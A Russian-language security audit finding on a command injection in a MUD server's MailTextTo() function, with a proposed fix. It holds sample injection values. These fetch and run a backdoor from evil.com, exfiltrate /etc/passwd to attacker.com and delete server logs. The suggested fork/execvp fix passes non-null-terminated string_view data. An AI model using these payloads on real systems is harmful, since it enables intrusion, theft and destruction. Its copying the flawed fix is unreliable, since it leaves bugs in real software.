# Command Injection в do_inspect.cpp (MailTextTo)

**Файл**: src/engine/ui/cmd_god/do_inspect.cpp
**Функция**: MailTextTo()
**Критичность**: CRITICAL

## Проблема
Функция `MailTextTo()` передаёт пользовательские данные (адрес и текст) напрямую в `system()`:

```cpp
void MailTextTo(std::string_view address, std::string_view text) {
    std::string cmd_line = fmt::format("python3 MailTextTo.py {} {} &", address, text);
    auto result = system(cmd_line.c_str());
    UNUSED_ARG(result);
}
```

**Оба параметра** (`address` и `text`) потенциально контролируются пользователем (даже если это god-команда).

## Эксплуатация

### Вариант 1: Через адрес
```
address = "user@test.com; wget http://evil.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh"
```

Выполнится:
```bash
python3 MailTextTo.py user@test.com; wget http://evil.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh some_text &
```

### Вариант 2: Через текст
```
text = "message $(curl http://attacker.com/steal?data=$(cat /etc/passwd))"
```

Выполнится command substitution и отправит данные на сервер атакующего.

### Вариант 3: Комбинированная атака
```
address = "admin@mud.ru"
text = "; rm -rf /var/log/* #"
```

Выполнится:
```bash
python3 MailTextTo.py admin@mud.ru ; rm -rf /var/log/* # &
```

## Влияние
- **CRITICAL**: Выполнение произвольных команд с правами сервера
- Даже если это god-команда, взломанный god-аккаунт может скомпрометировать весь сервер
- Возможна кража данных, установка backdoor, DoS

## Решение

**Использовать fork/execve:**
```cpp
void MailTextTo(std::string_view address, std::string_view text) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        char* args[] = {
            (char*)"python3",
            (char*)"MailTextTo.py",
            (char*)address.data(),
            (char*)text.data(),
            nullptr
        };
        execvp("python3", args);
        _exit(1);
    }
    // Parent continues
}
```

**Или валидировать и экранировать:**
```cpp
std::string shell_escape(std::string_view input) {
    std::string result;
    result.reserve(input.size() + 2);
    result += "'";
    for (char c : input) {
        if (c == '\'') {
            result += "'\\''";
        } else {
            result += c;
        }
    }
    result += "'";
    return result;
}

void MailTextTo(std::string_view address, std::string_view text) {
    std::string safe_address = shell_escape(address);
    std::string safe_text = shell_escape(text);
    std::string cmd_line = fmt::format("python3 MailTextTo.py {} {} &",
                                        safe_address, safe_text);
    auto result = system(cmd_line.c_str());
    UNUSED_ARG(result);
}
```

**РЕКОМЕНДАЦИЯ**: Использовать fork/execve для полного устранения проблемы.

**Связано с**:
- 007_command_injection_critical.md (password.cpp)
- 019_command_injection_interpreter.md
